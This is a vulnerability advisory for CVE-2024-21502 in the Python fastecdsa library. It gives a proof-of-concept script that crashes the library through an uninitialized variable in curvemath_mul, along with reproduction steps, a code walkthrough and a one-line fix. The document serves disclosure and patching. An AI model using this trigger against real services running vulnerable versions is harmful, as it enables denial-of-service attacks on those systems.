[CVE-2024-21502  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2024-21502) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-457  (opens in a new tab)](https://cwe.mitre.org/data/definitions/457.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses First added by Snyk
## How to fix?

Upgrade `fastecdsa` to version 2.3.2 or higher.

## Overview

[fastecdsa](https://github.com/AntonKueltz/fastecdsa) is a python package for doing fast elliptic curve cryptography, specifically digital signatures.

Affected versions of this package are vulnerable to Use of Uninitialized Variable on the stack, via the `curvemath_mul` function in `src/curveMath.c`, due to being used and interpreted as user-defined type. Depending on the variable's actual value it could be arbitrary `free()`, arbitrary `realloc()`, null pointer dereference and other. Since the stack can be controlled by the attacker, the vulnerability could be used to corrupt allocator structure, leading to possible heap exploitation. The attacker could cause denial of service by exploiting this vulnerability.

## PoC

```
#!/usr/bin/env python3

import sys
print(sys.version)

from fastecdsa.curve import Curve
from fastecdsa.point import Point

import time
time.sleep(2) # time to attach in gdb

MyCurve = Curve(
    p  = 0x10001,
    a  = 0x3,
    b  = 0x0,
    q  = 0x10202,
    gx = 0x427e,
    gy = 0x4ccb,
    name = 'MyCurve',
)

P = Point(x = 0, y = 0, curve = MyCurve)
print(P)

Q = 123 * P # trigger is here
print(Q)

```

### CVSS Scores

version 3.1
### Snyk

7.5 high

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is no loss of confidentiality within the impacted component.

  **None**
* Integrity (I)

  There is no loss of integrity within the impacted component.

  **None**
* Availability (A)

  There is a total loss of availability, resulting in the attacker being able to fully deny access to resources in the impacted component; this loss is either sustained (while the attacker continues to deliver the attack) or persistent (the condition persists even after the attack has completed). Alternatively, the attacker has the ability to deny some availability, but the loss of availability presents a direct, serious consequence to the impacted component (e.g., the attacker cannot disrupt existing connections, but can prevent new connections; the attacker can repeatedly exploit a vulnerability that, in each instance of a successful attack, leaks a only small amount of memory, but after repeated exploitation causes a service to become completely unavailable).

  **High**

## Package details

*Package manager*: pip

*Affected module*: [fastecdsa](https://pypi.org/project/fastecdsa/)

*GitHub repo*: [AntonKueltz/fastecdsa](https://github.com/AntonKueltz/fastecdsa)

*Module description*:

> This is a python package for doing fast elliptic curve cryptography, specifically digital signatures.

## Vulnerability description

Memory corruption in Python external module. Possible risk: denial of service, sensitive info leakage, remote code execution.

Vulnerability: uninitialized variable on the stack. Since the variable is used and interpreted as user-defined type, it leads to undefined behaviour. Depends on the variable's actual value it could be arbitrary `free()`, arbitrary `realloc()`, null pointer dereference and other.

## How to reproduce

I've tested it on Ubuntu 22.04.3 LTS, kernel version: 5.15.0-84-generic.

There is a simple PoC in file <poc.py>, the trigger is located in line 25. You could use <Dockerfile> in order to preserve the environment.

1. Build the image

```
docker build --tag fastecdsa-poc .
```

2. Run the image

```
docker run --rm fastecdsa-poc
```

3. Expected behaviour

```
$ docker run --rm fastecdsa-poc
3.11.8 (main, Feb 13 2024, 09:58:12) [GCC 12.2.0]
X: 0x0
Y: 0x0
(On curve <MyCurve>)
free(): invalid pointer
Aborted (core dumped)
```

The vulnerability is located in file [src/curveMath.c](https://github.com/AntonKueltz/fastecdsa/blob/v2.3.1/src/curveMath.c). Function [curvemath\_mul](https://github.com/AntonKueltz/fastecdsa/blob/v2.3.1/src/curveMath.c#L210) is used to calculate point multiplication. This is a binding, so the function could be called from Python code directly.

```
static PyObject * curvemath_mul(PyObject *self, PyObject *args) {
    char * x, * y, * d, * p, * a, * b, * q, * gx, * gy;

    if (!PyArg_ParseTuple(args, "sssssssss", &x, &y, &d, &p, &a, &b, &q, &gx, &gy)) {
        return NULL;
    }

    PointZZ_p result;
    mpz_t scalar;
    mpz_init_set_str(scalar, d, 10);
    CurveZZ_p * curve = buildCurveZZ_p(p, a, b, q, gx, gy, 10);;

    PointZZ_p * point = buildPointZZ_p(x, y, 10);
    pointZZ_pMul(&result, point, scalar, curve);
    destroyPointZZ_p(point);
    destroyCurveZZ_p(curve);

    char * resultX = mpz_get_str(NULL, 10, result.x);
    char * resultY = mpz_get_str(NULL, 10, result.y);
    mpz_clears(result.x, result.y, scalar, NULL);

    PyObject * ret = Py_BuildValue("ss", resultX, resultY);
    free(resultX);
    free(resultY);
    return ret;
}
```

Please notice that variable `PointZZ_p result` is unitialized. Then it's passed to functions `pointZZ_pMul` and `mpz_clears`. Our target is the second function `mpz_clears` since it calls `free()` internally. We need to remain the variable uninitialized after calling `pointZZ_pMul`.

Let's look at the function [pointZZ\_pMul](https://github.com/AntonKueltz/fastecdsa/blob/v2.3.1/src/curveMath.c#L124). Here is the code at the beginning:

```
void pointZZ_pMul(PointZZ_p * rop, const PointZZ_p * point, const mpz_t scalar, const CurveZZ_p * curve) {
    // handle the identity element
    if(pointZZ_pIsIdentityElement(point)) {
        return pointZZ_pSetToIdentityElement(rop);
    }

    PointZZ_p R0, R1, tmp;
    mpz_inits(R1.x, R1.y, tmp.x, tmp.y, NULL);
    mpz_init_set(R0.x, point->x);
    mpz_init_set(R0.y, point->y);
    pointZZ_pDouble(&R1, point, curve);

    // truncated because the last part is not relevant
}
```

The first parameter (`PointZZ_p * rop`) is not initialized again (it's responsibility of the caller). Passing condition `pointZZ_pIsIdentityElement(point)` is trivial because we can construct arbitrary curve and arbitrary point on it. Let's look at the function [pointZZ\_pSetToIdentityElement](https://github.com/AntonKueltz/fastecdsa/blob/v2.3.1/src/curveMath.c#L23):

```
void pointZZ_pSetToIdentityElement(PointZZ_p * op) {
    mpz_set_ui(op->x, 0);
    mpz_set_ui(op->y, 0);
}
```

The parameter `PointZZ_p * op` is still not initialized. This is an undefined behaviour again.

So, the complete path below:

1. Python code (point multiplication)
2. Call function `curvemath_mul` (unitialized variable `result`)
3. Call function `pointZZ_pMul` (unitialized argument `rop`)
4. Call function `pointZZ_pSetToIdentityElement` (unitialized argument `op`)
5. Return from function `pointZZ_pSetToIdentityElement` (argument `op` is still unitialized)
6. Return from function `pointZZ_pMul` (argument `rop` is still unitialized)
7. Call function `mpz_clears` (unitialized arguments)
8. Call function `free` (argument is not initialized)

Since the stack can be controlled by attacker, the vulnerability could be used to corrupt allocator structure. It leads to possible heap exploitation.

## Suggested fix

Add initialization of variable:

```
PointZZ_p result;
mpz_inits(result.x, result.y, NULL);
```

## How it was found

Some time ago I've created a curve with b=0. Since the point (0, 0) is on created curve, the vulnerability was trigged accidentally. I started the investigation and found the root cause.
